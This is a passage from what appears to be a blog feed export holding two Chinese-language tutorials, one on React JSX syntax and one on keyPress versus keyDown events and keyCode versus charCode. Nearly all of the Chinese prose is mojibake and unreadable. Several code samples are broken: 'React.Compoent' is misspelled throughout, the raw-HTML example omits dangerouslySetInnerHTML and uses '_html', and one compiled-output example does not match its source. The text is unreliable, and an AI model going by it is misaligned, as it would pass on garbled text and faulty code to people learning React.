çœ‹å®Œä¸Šè¿°èªªæ˜æ˜¯ä¸æ˜¯æ„Ÿè¦º React çµåˆ JSX çš„å¯«æ³•æ›´æ˜“è®€æ˜“æ‡‚ï¼Ÿäº‹å¯¦ä¸Šï¼Œç•¶ Component çµ„æˆè¶Šä¾†è¶Šè¤‡é›œæ™‚ï¼Œè‹¥ä½¿ç”¨ JSX å°‡å¯ä»¥è®“æ•´å€‹çµæ§‹æ›´åŠ ç›´è§€ï¼Œå¯è®€æ€§è¼ƒé«˜ã€‚
2. æ›´åŠ ç°¡æ½”é›–ç„¶æœ€çµ‚ JSX æœƒè½‰æ›æˆ JavaScriptï¼Œä½†ä½¿ç”¨ JSX å¯ä»¥è®“ç¨‹å¼çœ‹èµ·ä¾†æ›´åŠ ç°¡æ½”ï¼Œä»¥ä¸‹ç‚ºä½¿ç”¨ JSX å’Œä¸ä½¿ç”¨ JSX çš„ç¯„ä¾‹ï¼š
&lt;a href=&quot;https://facebook.github.io/react/&quot;&gt;Hello!&lt;/a&gt;

ä¸ä½¿ç”¨ JSX çš„æƒ…æ³ï¼ˆè¨˜å¾—æˆ‘å€‘èªªé JSX æ˜¯é¸ç”¨çš„ï¼‰ï¼š
// React.createElement(å…ƒä»¶/HTMLæ¨™ç±¤, å…ƒä»¶å±¬æ€§ï¼Œä»¥ç‰©ä»¶è¡¨ç¤º, å­å…ƒä»¶)React.createElement(&#x27;a&#x27;, &#123;href: &#x27;https://facebook.github.io/react/&#x27;&#125;, &#x27;Hello!&#x27;)

3. çµåˆåŸç”Ÿ JavaScript èªæ³•JSX ä¸¦éä¸€ç¨®å…¨æ–°çš„èªè¨€ï¼Œè€Œæ˜¯ä¸€ç¨®èªæ³•ç³–ï¼ˆSyntatic Sugarï¼‰ï¼Œä¸€ç¨®èªæ³•é¡ä¼¼ XML çš„ ECMAScript èªæ³•æ“´å……ï¼Œæ‰€ä»¥ä¸¦æ²’æœ‰æ”¹è®Š JavaScript èªæ„ã€‚é€éçµåˆ JavaScript ï¼Œå¯ä»¥é‡‹æ”¾ JavaScript èªè¨€æœ¬èº«èƒ½åŠ›ã€‚ä¸‹é¢ä¾‹å­å°±æ˜¯é‹ç”¨ map æ–¹æ³•å’Œ Arrow functionï¼Œè¼•æ˜“æŠŠ result å€¼è¿­ä»£å‡ºä¾†ï¼Œç”¢ç”Ÿç„¡åºæ¸…å–®ï¼ˆulï¼‰çš„å…§å®¹ï¼Œä¸ç”¨å†ä½¿ç”¨è¹©è…³çš„æ¨¡ç‰ˆèªè¨€ï¼š
// const ç‚ºå¸¸æ•¸const lists = [&#x27;JavaScript&#x27;, &#x27;Java&#x27;, &#x27;Node&#x27;, &#x27;Python&#x27;];class HelloMessage extends React.Compoent &#123;  render() &#123;    return (    &lt;ul&gt;      &#123;lists.map((result) =&gt; &#123;        return (&lt;li&gt;&#123;result&#125;&lt;/li&gt;);      &#125;)&#125;    &lt;/ul&gt;);  &#125;&#125;

äºŒã€JSX ç”¨æ³•æ‘˜è¦1. ç’°å¢ƒè¨­å®šèˆ‡ä½¿ç”¨æ–¹å¼åˆæ­¥äº†è§£ç‚ºä½•è¦ä½¿ç”¨ JSX å¾Œï¼Œæˆ‘å€‘ä¾†èŠèŠ JSX çš„ç”¨æ³•ã€‚ä¸€èˆ¬è€Œè¨€ JSX é€šå¸¸æœ‰å…©ç¨®ä½¿ç”¨æ–¹å¼ï¼š

ä½¿ç”¨ browserify æˆ– webpack ç­‰ CommonJS bundler ä¸¦æ•´åˆ babel é è™•ç†
æ–¼ç€è¦½å™¨ç«¯åšè§£æ

åœ¨é€™é‚Šç°¡å–®èµ·è¦‹ï¼Œæˆ‘å€‘å…ˆä½¿ç”¨ç¬¬äºŒç¨®æ–¹å¼ï¼Œå…ˆè®“å¤§å®¶å°ˆæ³¨ç†Ÿæ‚‰ JSX èªæ³•ä½¿ç”¨ï¼Œç­‰åˆ°å¾Œé¢ç« ç¯€å†æ•™å¤§å®¶ä½¿ç”¨ bundler çš„æ–¹å¼å»åšè§£æï¼ˆå¯ä»¥è©¦è‘—æŠŠä¸‹é¢çš„åŸå§‹ç¢¼è²¼åˆ° JSbin çš„ HTML çœ‹çµæœï¼‰ï¼š
&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot; /&gt;    &lt;title&gt;Hello React!&lt;/title&gt;    &lt;!-- è«‹å…ˆæ–¼ index.html ä¸­å¼•å…¥ react.js, react-dom.js å’Œ babel-core çš„ browser.min.js --&gt;    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/react/15.0.1/react.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/react/15.0.1/react-dom.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/babel-core/5.8.23/browser.min.js&quot;&gt;&lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div id=&quot;example&quot;&gt;&lt;/div&gt;    &lt;script type=&quot;text/babel&quot;&gt;      // ç¨‹å¼ç¢¼å¯«åœ¨é€™é‚Šï¼      ReactDOM.render(        &lt;h1&gt;Hello, world!&lt;/h1&gt;,        document.getElementById(&#x27;example&#x27;)      );    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;

ä¸€èˆ¬è¼‰å…¥ JSX æ–¹å¼æœ‰ï¼š

å…§åµŒ

&lt;script type=&quot;text/babel&quot;&gt;  ReactDOM.render(    &lt;h1&gt;Hello, world!&lt;/h1&gt;,    document.getElementById(&#x27;example&#x27;)  );&lt;/script&gt;


å¾å¤–éƒ¨å¼•å…¥

&lt;script type=&quot;text/jsx&quot; src=&quot;main.jsx&quot;&gt;&lt;/script&gt; 
2. æ¨™ç±¤ç”¨æ³•JSX æ¨™ç±¤éå¸¸é¡ä¼¼ XML ï¼Œå¯ä»¥ç›´æ¥æ›¸å¯«ã€‚ä¸€èˆ¬ Component å‘½åé¦–å­—å¤§å¯«ï¼ŒHTML Tags å°å¯«ã€‚ä»¥ä¸‹æ˜¯ä¸€å€‹å»ºç«‹ Component çš„ classï¼š
class HelloMessage extends React.Compoent &#123;  render() &#123;    return (      &lt;div&gt;        &lt;p&gt;Hello React!&lt;/p&gt;        &lt;MessageList /&gt;      &lt;/div&gt;    );  &#125;&#125;

3. è½‰æ›æˆ JavaScriptJSX æœ€çµ‚æœƒè½‰æ›æˆç€è¦½å™¨å¯ä»¥è®€å–çš„ JavaScriptï¼Œä»¥ä¸‹ç‚ºå…¶è¦å‰‡ï¼š
React.createElement(  string/ReactClass, // è¡¨ç¤º HTML å…ƒç´ æˆ–æ˜¯ React Component  [object props], // å±¬æ€§å€¼ï¼Œç”¨ç‰©ä»¶è¡¨ç¤º  [children] // æ¥ä¸‹ä¾†åƒæ•¸çš†ç‚ºå…ƒç´ å­å…ƒç´ )

è§£æå‰ï¼ˆç‰¹åˆ¥æ³¨æ„åœ¨ JSX ä¸­ä½¿ç”¨ JavaScript è¡¨é”å¼æ™‚ä½¿ç”¨ {} æ‹¬èµ·ï¼Œå¦‚ä¸‹æ–¹ç¯„ä¾‹çš„ textï¼Œè£¡é¢å°æ‡‰çš„æ˜¯è®Šæ•¸ã€‚è‹¥éœ€å¸Œæœ›æ”¾ç½®ä¸€èˆ¬æ–‡å­—ï¼Œè«‹åŠ ä¸Š &#39;&#39;ï¼‰ï¼š
var text = &#x27;Hello React&#x27;;&lt;h1&gt;&#123;text&#125;&lt;/h1&gt;&lt;h1&gt;&#123;&#x27;text&#x27;&#125;&lt;/h1&gt;

è§£æå®Œå¾Œï¼š
var text = &#x27;Hello React&#x27;;React.createElement(&quot;h1&quot;, null, &quot;Hello React!&quot;);

å¦å¤–è¦ç‰¹åˆ¥è¦æ³¨æ„çš„æ˜¯ç”±æ–¼ JSX æœ€çµ‚æœƒè½‰æˆ JavaScript ä¸”æ¯ä¸€å€‹ JSX ç¯€é»éƒ½å°æ‡‰åˆ°ä¸€å€‹ JavaScript å‡½æ•¸ï¼Œæ‰€ä»¥åœ¨ Component çš„ render æ–¹æ³•ä¸­åªèƒ½å›å‚³ä¸€å€‹æ ¹ç¯€é»ï¼ˆRoot Nodesï¼‰ã€‚ä¾‹å¦‚ï¼šè‹¥æœ‰å¤šå€‹ &lt;div&gt; è¦ render è«‹åœ¨å¤–é¢åŒ…ä¸€å€‹ Component æˆ– &lt;div&gt;ã€&lt;span&gt; å…ƒç´ ã€‚
4. è¨»è§£ç”±æ–¼ JSX æœ€çµ‚æœƒç·¨è­¯æˆ JavaScriptï¼Œè¨»è§£ä¹Ÿä¸€æ¨£ä½¿ç”¨ // å’Œ /**/ ç•¶åšè¨»è§£æ–¹å¼ï¼š
// å–®è¡Œè¨»è§£/*  å¤šè¡Œè¨»è§£*/var content = (  &lt;List&gt;      &#123;/* è‹¥æ˜¯åœ¨å­å…ƒä»¶è¨»è§£è¦åŠ  &#123;&#125;  */&#125;      &lt;Item        /* å¤šè¡Œ           è¨»è§£           å–” */        name=&#123;window.isLoggedIn ? window.name : &#x27;&#x27;&#125; // å–®è¡Œè¨»è§£      /&gt;  &lt;/List&gt;);

5. å±¬æ€§åœ¨ HTML ä¸­ï¼Œæˆ‘å€‘å¯ä»¥é€éæ¨™ç±¤ä¸Šçš„å±¬æ€§ä¾†æ”¹è®Šæ¨™ç±¤å¤–è§€æ¨£å¼ï¼Œåœ¨ JSX ä¸­ä¹Ÿå¯ä»¥ï¼Œä½†è¦æ³¨æ„ class å’Œ for ç”±æ–¼ç‚º JavaScript ä¿ç•™é—œéµå­—ç”¨æ³•ï¼Œå› æ­¤åœ¨ JSX ä¸­ä½¿ç”¨ className å’Œ htmlFor æ›¿ä»£ã€‚
class HelloMessage extends React.Compoent &#123;  render() &#123;    return (      &lt;div className=&quot;message&quot;&gt;        &lt;p&gt;Hello React!&lt;/p&gt;      &lt;/div&gt;    );  &#125;&#125;

Boolean å±¬æ€§åœ¨ JSX ä¸­é è¨­åªæœ‰å±¬æ€§åç¨±ä½†æ²’è¨­å€¼ç‚º trueï¼Œä¾‹å¦‚ä»¥ä¸‹ç¬¬ä¸€å€‹ input æ¨™ç±¤ disabled  é›–ç„¶æ²’è¨­å€¼ï¼Œä½†çµæœå’Œä¸‹é¢çš„ input ç‚ºç›¸åŒï¼š
&lt;input type=&quot;button&quot; disabled /&gt;;&lt;input type=&quot;button&quot; disabled=&#123;true&#125; /&gt;;

åä¹‹ï¼Œè‹¥æ˜¯æ²’æœ‰å±¬æ€§ï¼Œå‰‡é è¨­é è¨­ç‚º falseï¼š
&lt;input type=&quot;button&quot; /&gt;;&lt;input type=&quot;button&quot; disabled=&#123;false&#125; /&gt;;

6. æ“´å±•å±¬æ€§åœ¨ ES6 ä¸­ä½¿ç”¨ ... æ˜¯è¿­ä»£ç‰©ä»¶çš„æ„æ€ï¼Œå¯ä»¥æŠŠæ‰€æœ‰ç‰©ä»¶å°æ‡‰çš„å€¼è¿­ä»£å‡ºä¾†è¨­å®šå±¬æ€§ï¼Œä½†è¦æ³¨æ„å¾Œé¢è¨­å®šçš„å±¬æ€§æœƒè“‹æ‰å‰é¢ç›¸åŒå±¬æ€§ï¼š
var props = &#123;  style: &quot;width:20px&quot;,  className: &quot;main&quot;,  value: &quot;yo&quot;,  &#125;&lt;HelloMessage  &#123;...props&#125; value=&quot;yo&quot; /&gt;// ç­‰æ–¼ä»¥ä¸‹React.createElement(&quot;h1&quot;, React._spread(&#123;&#125;, props, &#123;value: &quot;yo&quot;&#125;), &quot;Hello React!&quot;);

7. è‡ªå®šç¾©å±¬æ€§è‹¥æ˜¯å¸Œæœ›ä½¿ç”¨è‡ªå®šç¾©å±¬æ€§ï¼Œå¯ä»¥ä½¿ç”¨ data-ï¼š
&lt;HelloMessage data-attr=&quot;xd&quot; /&gt;

8. é¡¯ç¤º HTMLé€šå¸¸ç‚ºäº†é¿å…è³‡è¨Šå®‰å…¨å•é¡Œï¼Œæˆ‘å€‘æœƒéæ¿¾æ‰ HTMLï¼Œè‹¥éœ€è¦é¡¯ç¤ºçš„è©±å¯ä»¥ä½¿ç”¨ï¼š
&lt;div&gt;&#123;&#123;_html: &#x27;&lt;h1&gt;Hello World!!&lt;/h1&gt;&#x27;&#125;&#125;&lt;/div&gt;

9. æ¨£å¼ä½¿ç”¨åœ¨ JSX ä¸­ä½¿ç”¨å¤–è§€æ¨£å¼æ–¹æ³•å¦‚ä¸‹ï¼Œç¬¬ä¸€å€‹ &#123;&#125; æ˜¯ JSX èªæ³•ï¼Œç¬¬äºŒå€‹ç‚º JavaScript ç‰©ä»¶ã€‚èˆ‡ä¸€èˆ¬å±¬æ€§å€¼ç”¨ - åˆ†éš”ä¸åŒï¼Œç‚ºé§å³°å¼å‘½åå¯«æ³•ï¼š
&lt;HelloMessage style=&#123;&#123; color: &#x27;#FFFFFF&#x27;, fontSize: &#x27;30px&#x27;&#125;&#125; /&gt;

10. äº‹ä»¶è™•ç†äº‹ä»¶è™•ç†ç‚ºå‰ç«¯é–‹ç™¼çš„é‡é ­æˆ²ï¼Œåœ¨ JSX ä¸­é€é inline äº‹ä»¶çš„ç¶å®šä¾†ç›£è½ä¸¦è™•ç†äº‹ä»¶ï¼ˆæ³¨æ„ä¹Ÿæ˜¯é§å³°å¼å¯«æ³•ï¼‰ï¼š
&lt;HelloMessage onClick=&#123;this.onBtn&#125; /&gt;

ç¸½çµä»¥ä¸Šå°±æ˜¯ JSX ç°¡æ˜å…¥é–€æ•™å­¸ï¼Œå¸Œæœ›é€éä»¥ä¸Šä»‹ç´¹ï¼Œè®“è®€è€…äº†è§£åœ¨ React ä¸­ç‚ºä½•è¦ä½¿ç”¨ JSXï¼Œä»¥åŠ JSX åŸºæœ¬æ¦‚å¿µå’Œç”¨æ³•ã€‚æœ€å¾Œç‚ºå¤§å®¶è¤‡ç¿’ä¸€ä¸‹ï¼šåœ¨ React ä¸–ç•Œè£¡ï¼Œæ‰€æœ‰äº‹ç‰©éƒ½æ˜¯ä»¥ Component ç‚ºåŸºç¤ï¼Œé€šå¸¸æœƒå°‡åŒä¸€å€‹ Compoent ç›¸é—œçš„ç¨‹å¼å’Œè³‡æºéƒ½æ”¾åœ¨ä¸€èµ·ï¼Œè€Œåœ¨æ’°å¯« React Component æ™‚æˆ‘å€‘å¸¸æœƒä½¿ç”¨ JSX çš„æ–¹å¼ä¾†æå‡ç¨‹å¼æ’°å¯«æ•ˆç‡ã€‚JSX æ˜¯ä¸€ç¨®èªæ³•é¡ä¼¼ XML çš„ ECMAScript èªæ³•æ“´å……ï¼Œå¯ä»¥å–„ç”¨ JavaScript çš„å¼·å¤§èƒ½åŠ›ï¼Œæ”¾æ£„è¹©è…³çš„æ¨¡ç‰ˆèªè¨€ã€‚ç•¶ç„¶ JSX ä¸¦éå¼·åˆ¶ä½¿ç”¨ï¼Œä½ ä¹Ÿå¯ä»¥é¸æ“‡ä¸ç”¨ï¼Œå› ç‚ºæœ€çµ‚ JSX çš„å…§å®¹æœƒè½‰åŒ–æˆ JavaScriptã€‚ç•¶ç›¸ä¿¡é–±è®€å®Œä¸Šè¿°çš„å…§å®¹å¾Œï¼Œä½ æœƒé–‹å§‹èªçœŸè€ƒæ…®ä½¿ç”¨ JSX çš„èªæ³•ã€‚
å»¶ä¼¸é–±è®€
Imperative programming or declarative programming
JSX in Depth
å¾é›¶é–‹å§‹å­¸ Reactï¼ˆReactJS 101ï¼‰

(image via adweek, codecondo)
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>React, React Native, ES5, ES6, ES7, JavaScript, ECMAScript2015, Webpack, JSX</tag>
      </tags>
  </entry>
  <entry>
    <title>å¾ React åŸå§‹ç¢¼çœ‹ keyPress èˆ‡ keyDown äº‹ä»¶</title>
    <url>/2019/03/23/react-keyboard-event/</url>
    <content><![CDATA[å‰è¨€å‰é™£å­æœ‰å€‹å­¸ç”Ÿè·‘ä¾†å•æˆ‘ä¸€å€‹å•é¡Œï¼Œèªªä»–åœ¨å¯« React çš„æ™‚å€™åˆ†ä¸æ¸…æ¥š keyPress èˆ‡ keyDown é€™å…©å€‹äº‹ä»¶ï¼Œé‚„æœ‰ keyCode è·Ÿ charCode é€™å…©å€‹æ±è¥¿ï¼Œæœ‰æ™‚å€™æ‹¿å¾—åˆ°å€¼ï¼Œæœ‰æ™‚å€™å»æ‹¿ä¸åˆ°ï¼Œè¦ºå¾—ååˆ†å›°æƒ‘ã€‚
æˆ‘åŸæœ¬ä»¥ç‚ºæ˜¯ React åšäº†ä¸€äº›è™•ç†ï¼Œæ‰€ä»¥å»çœ‹äº†ä¸€ä¸‹åŸå§‹ç¢¼ã€‚å¾Œä¾†ç™¼ç¾ React çš„ç¢ºæœ‰åšä¸€äº›è™•ç†ï¼Œä½†å¯¦éš›ä¸Šé€™å€‹å•é¡Œè·Ÿ React æ²’ä»€éº¼é—œä¿‚ï¼Œè€Œæ˜¯ keyPress è·Ÿ keyDown é€™å…©å€‹åŸç”Ÿçš„ JavaScript äº‹ä»¶æœ¬ä¾†å°±æœ‰å·®ç•°ã€‚
æ‰€ä»¥ä»–ç¢°åˆ°çš„å•é¡Œè·Ÿ React ä¸€é»é—œä¿‚éƒ½æ²’æœ‰ï¼Œåªæ˜¯å°é€™éƒ¨åˆ†çš„äº‹ä»¶æ©Ÿåˆ¶ä¸ç†Ÿè€Œå·²ã€‚
å„˜ç®¡å¦‚æ­¤ï¼Œèƒ½å¤ è—‰ç”±ä¸€å€‹å¯¦éš›çš„å•é¡Œä¾†åƒè€ƒä¸€ä¸‹ React çš„å¯¦ä½œé‚„æ˜¯ä»¶å¾ˆä¸éŒ¯çš„äº‹ï¼Œè€Œä¸” React çš„è¨»è§£å¯«å¾—å¾ˆå¥½ã€‚
å› æ­¤ï¼Œé€™ç¯‡æœƒå…ˆå¸¶å¤§å®¶ä¾†çœ‹é€™å…©å€‹äº‹ä»¶çš„ä¸åŒï¼Œæœ€å¾Œå†ä¾†çœ‹ React è£¡é¢æ€éº¼åšä¸€äº›è™•ç†ã€‚
keyPress è·Ÿ keyDown çš„å·®ç•°é¦–å…ˆï¼Œæˆ‘å€‘è¦ä¾†çœ‹çœ‹ keyPress èˆ‡ keyDown é€™å…©å€‹åŸç”Ÿäº‹ä»¶çš„å·®ç•°åˆ°åº•åœ¨å“ªè£¡ï¼Œé€™éƒ¨åˆ†æˆ‘å€‘ç›´æ¥è«‹å‡º MDN ä¾†ç‚ºæˆ‘å€‘åšè§£é‡‹ï¼š

The keypress event is fired when a key that produces a character value is pressed down. Examples of keys that produce a character value are alphabetic, numeric, and punctuation keys. Examples of keys that donâ€™t produce a character value are modifier keys such as Alt, Shift, Ctrl, or Meta.

ä¾†æºï¼šhttps://developer.mozilla.org/en-US/docs/Web/Events/keypress

The keydown event is fired when a key is pressed down.
Unlike the keypress event, the keydown event is fired for all keys, regardless of whether they produce a character value.

ä¾†æºï¼šhttps://developer.mozilla.org/en-US/docs/Web/Events/keydown
ç°¡å–®ä¾†èªªå‘¢ï¼ŒkeyDown æœƒåœ¨ä½ æŒ‰ä¸‹ä»»ä½•æŒ‰éµæ™‚è§¸ç™¼ï¼Œä½†æ˜¯ keyPress åªæœƒåœ¨ä½ æŒ‰ä¸‹çš„æŒ‰éµå¯ä»¥ç”¢ç”Ÿå‡ºä¸€å€‹å­—å…ƒçš„æ™‚å€™è§¸ç™¼ï¼Œç™½è©±ä¸€é»å°±æ˜¯ä½ æŒ‰ä¸‹é€™æŒ‰éµæ˜¯åœ¨æ‰“å­—ã€‚
ä¾‹å¦‚èªªä½ æŒ‰aï¼Œç•«é¢ä¸Šæœƒå‡ºç¾ä¸€å€‹å­—å…ƒ aï¼Œæ‰€ä»¥ keyDown è·Ÿ keyPress éƒ½æœƒè§¸ç™¼ã€‚ä½†å¦‚æœä½ æŒ‰shiftï¼Œç•«é¢ä¸Šä»€éº¼éƒ½ä¸æœƒå‡ºç¾ï¼Œæ‰€ä»¥åªæœ‰ keyDown æœƒè§¸ç™¼ã€‚
w3c æä¾›äº†ä¸€å€‹å¾ˆä¸éŒ¯çš„ç¶²é ï¼šKey and Character Codes vs. Event Types
ï¼Œè®“ä½ å¯ä»¥è‡ªå·±å¯¦é©—çœ‹çœ‹ã€‚
ä¸‹åœ–ä¸­æˆ‘è¼¸å…¥ aï¼Œå…©è€…éƒ½æœƒè§¸ç™¼ï¼Œæ¥è‘—æˆ‘æŒ‰ shiftï¼Œåªæœƒè§¸ç™¼ keyDownï¼Œå†ä¾†æŒ‰ backspace æŠŠæ–‡å­—åˆªæ‰ï¼Œä¹Ÿåªæœƒè§¸ç™¼ keyDownï¼š

æ‰€ä»¥é€™å…©è€…çš„å·®ç•°ç›¸ä¿¡å¤§å®¶æ‡‰è©²å¯ä»¥å¾ˆæ¸…æ¥šçš„çŸ¥é“äº†ï¼ŒkeyDown å¯ä»¥ç•¶ä½œæ˜¯ã€ŒæŒ‰ä¸‹æŒ‰éµã€ï¼ŒkeyPress å‰‡ç•¶ä½œã€Œè¼¸å…¥æ±è¥¿ã€æ™‚æœƒè§¸ç™¼çš„äº‹ä»¶ã€‚
æ¥è‘—æˆ‘å€‘ä¾†è«‡è«‡ keyCode è·Ÿ charCodeã€‚
keyCode èˆ‡ charCode çš„å·®ç•°å…ˆä¾†è«‡è«‡ charCode å¥½äº†ï¼Œæˆ–è¨±ä½ æœ‰çœ‹é JavaScript è£¡é¢æœ‰å€‹å‡½å¼æ˜¯é€™æ¨£çš„ï¼š
console.log(String.fromCharCode(65)) // A

charCode å…¶å¯¦å°±æ˜¯æŸä¸€å€‹å­—å…ƒæ‰€ä»£è¡¨çš„ä¸€å€‹è™Ÿç¢¼ï¼Œæˆ–æ›´ç²¾ç¢ºä¸€é»åœ°èªªï¼Œå°±æ˜¯å®ƒçš„ Unicode ç·¨ç¢¼ã€‚
é€™é‚Šå¦‚æœä¸å¤ªç†Ÿçš„è©±å¯ä»¥åƒè€ƒé€™ç¯‡æ–‡ç« ï¼š[Guide] ç­è§£ç¶²é ä¸­çœ‹ä¸æ‡‚çš„ç·¨ç¢¼ï¼šUnicode åœ¨ JavaScript ä¸­çš„ä½¿ç”¨ã€‚
åœ¨ JavaScript è£¡é¢ä¹Ÿå¯ä»¥ç”¨å¦ä¸€å€‹å‡½å¼æ‹¿åˆ°å­—å…ƒæ‰€å°æ‡‰çš„ç·¨ç¢¼ï¼š
console.log(&#x27;å—¨&#x27;.charCodeAt(0)) // 21992

è‹¥æ˜¯ä½ æŠŠé€™ 21992 è½‰æˆ 16 é€²ä½ï¼Œæœƒè®Šæˆ 0x55E8ï¼Œé€™å€‹å…¶å¯¦å°±æ˜¯ã€Œå—¨ã€çš„ Unicodeï¼š
ï¼ˆä¾†æºï¼šhttps://www.cns11643.gov.tw/wordView.jsp?ID=90944ï¼‰
é‚£ä»€éº¼æ˜¯ keyCode å‘¢ï¼Ÿæ—¢ç„¶ charCode ä»£è¡¨è‘—æ˜¯ä¸€å€‹ charï¼ˆå­—å…ƒï¼‰çš„ codeï¼Œé‚£ keyCode é¡¯ç„¶å°±æ˜¯ä»£è¡¨ä¸€å€‹ keyï¼ˆæŒ‰éµï¼‰çš„ codeã€‚
æ¯ä¸€å€‹ã€ŒæŒ‰éµã€ä¹Ÿéƒ½æœ‰ä¸€å€‹å®ƒè‡ªå·±çš„ä»£ç¢¼ï¼Œè€Œä¸”æœ‰æ™‚å€™æœƒè®“ä½ æ··æ·†ï¼Œå› ç‚ºå®ƒè·Ÿ charCode å¯èƒ½æ˜¯ä¸€æ¨£çš„ã€‚
èˆ‰ä¾‹ä¾†èªªï¼šã€ŒAã€é€™å€‹æŒ‰éµçš„ keyCode æ˜¯ 65ï¼Œè€Œã€ŒAã€é€™å€‹å­—å…ƒçš„ charCode ä¹Ÿæ˜¯ 65ã€‚é€™æ‡‰è©²æ˜¯ç‚ºäº†æŸç¨®æ–¹ä¾¿æ€§æ‰€ä»¥é€™æ¨£è¨­è¨ˆï¼Œä½†ä½ è¦æ³¨æ„åˆ°ä¸€é»ï¼š

ç•¶æˆ‘æŒ‰ä¸‹ã€ŒAã€é€™å€‹æŒ‰éµçš„æ™‚å€™ï¼Œæˆ‘å¯èƒ½è¦æ‰“çš„æ˜¯ a æˆ–æ˜¯ Aï¼Œæœ‰å…©ç¨®å¯èƒ½

æˆ–æ˜¯èˆ‰å¦å¤–ä¸€å€‹ä¾‹å­ï¼Œç•¶ä½ è¦æ‰“æ•¸å­— 1 æ™‚ï¼Œå¦‚æœä½ æ˜¯ç”¨ Q ä¸Šæ–¹çš„é‚£é¡†æŒ‰éµè€Œä¸æ˜¯ç”¨ç´”æ•¸å­—éµç›¤ï¼Œä½ è¦æ‰“çš„å­—å¯èƒ½æ˜¯ã€Œ1ã€æˆ–æ˜¯ã€Œ!ã€æˆ–ç”šè‡³æ˜¯ã€Œã„…ã€ï¼Œå› ç‚ºå®ƒå€‘éƒ½æ˜¯åŒä¸€é¡†æŒ‰éµã€‚
ä¸€é¡†æŒ‰éµå°æ‡‰äº†ä¸åªä¸€å€‹å­—å…ƒï¼Œæ‰€ä»¥å–®å–®å¾ keyCodeï¼Œä½ æ˜¯æ²’è¾¦æ³•åˆ¤æ–·ä½¿ç”¨è€…æƒ³æ‰“ä»€éº¼å­—çš„ã€‚
è¬›åˆ°é€™è£¡ï¼Œæˆ‘å€‘å¯ä»¥ä¾†æƒ³ä¸€ä¸‹é€™å…©å€‹è·Ÿ keyPress èˆ‡ keyDown çš„é—œè¯äº†ã€‚
å‰›å‰›èªªåˆ° keyPress æ˜¯ä½ è¦è¼¸å…¥æ–‡å­—çš„æ™‚å€™æ‰æœƒè§¸ç™¼ï¼Œæ‰€ä»¥é€™å€‹äº‹ä»¶æœƒæ‹¿åˆ° charCodeï¼Œå› ç‚ºä½ è¦çŸ¥é“ä½¿ç”¨è€…æ‰“äº†ä»€éº¼å­—ã€‚é‚£ç‚ºä»€éº¼ä¸æ˜¯ keyCode å‘¢ï¼Ÿå› ç‚ºä½ å¾ keyCode æ ¹æœ¬ä¸çŸ¥é“ä»–æ‰“äº†ä»€éº¼å­—ï¼Œæ‰€ä»¥æ‹¿ keyCode ä¹Ÿæ²’ç”¨ã€‚
keyDown å‰‡æ˜¯åœ¨ä½ æŒ‰ä¸‹ä»»ä½•æŒ‰éµæ™‚éƒ½æœƒè§¸ç™¼ï¼Œé€™æ™‚å€™ä¸€å®šè¦æ‹¿ keyCodeï¼Œå› ç‚ºä½ è¦çŸ¥é“ä½¿ç”¨è€…æŒ‰äº†ä»€éº¼æŒ‰éµã€‚è‹¥æ˜¯æ‹¿ charCode çš„è©±ï¼Œä½ æŒ‰ shift æˆ–æ˜¯ ctrl å°±æ²’æœ‰å€¼äº†ï¼Œå› ç‚ºé€™ä¸æ˜¯ä¸€å€‹å­—å…ƒï¼Œå°±æ²’è¾¦æ³•çŸ¥é“ä½¿ç”¨è€…æŒ‰äº†ä»€éº¼ã€‚
ç¸½çµä¸€ä¸‹ï¼Œç•¶ä½ è¦åµæ¸¬ä½¿ç”¨è€…è¼¸å…¥æ–‡å­—çš„æ™‚å€™ï¼Œå°±ç”¨ keyPressï¼Œä¸¦ä¸”æ­é… charCode ä¾†çœ‹ä½¿ç”¨è€…å‰›å‰›è¼¸å…¥äº†ä»€éº¼ï¼›ç•¶ä½ æƒ³åµæ¸¬ä½¿ç”¨è€…ã€ŒæŒ‰ä¸‹æŒ‰éµã€çš„æ™‚å€™ï¼Œå°±ç”¨ keyDownï¼Œæ­é… keyCode ç²å¾—ä½¿ç”¨è€…æ‰€æŒ‰ä¸‹çš„æŒ‰éµã€‚
é€™å°±æ˜¯ keyPressã€keyDown ä»¥åŠ keyCode è·Ÿ charCode çš„å·®åˆ¥ã€‚
é †å¸¶ä¸€æï¼Œåœ¨è¼¸å…¥ä¸­æ–‡çš„æ™‚å€™ keyPress ä¸æœƒæœ‰å€¼ï¼ŒkeyDown å‰‡æœƒå›å‚³ä¸€å€‹ç¥ç§˜çš„ä»£ç¢¼ 229ï¼š

key èˆ‡ whichåœ¨ keyPress èˆ‡ keyDown é€™å…©å€‹ event è£¡é¢ï¼Œå…¶å¯¦é‚„æœ‰å…©å€‹å±¬æ€§ï¼škey èˆ‡ whichã€‚
æˆ‘å€‘å…ˆä¾†çœ‹ä¸€ä¸‹ which æ˜¯ä»€éº¼ï¼š

The which read-only property of the KeyboardEvent interface returns the numeric keyCode of the key pressed, or the character code (charCode) for an alphanumeric key pressed.

ä¾†æºï¼šhttps://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/which
æ ¹æ“šæˆ‘è‡ªå·±çš„ç†è§£ï¼Œç•¶ä½ åœ¨ keyPress è£¡é¢ç”¨ which çš„æ™‚å€™ï¼Œæ‹¿åˆ°çš„æ‡‰è©²å°±æ˜¯ charCodeï¼›åœ¨ keyDown è£¡é¢ç”¨çš„æ™‚å€™å°±æ˜¯ keyCodeï¼Œæ‰€ä»¥ä½ åœ¨å¯«ç¨‹å¼çš„æ™‚å€™å¯ä»¥çµ±ä¸€ç”¨ event.which ä¾†æ‹¿é€™å€‹è³‡è¨Šï¼Œä¸å¿…å†å€åˆ† keyCode æˆ–æ˜¯ charCodeã€‚
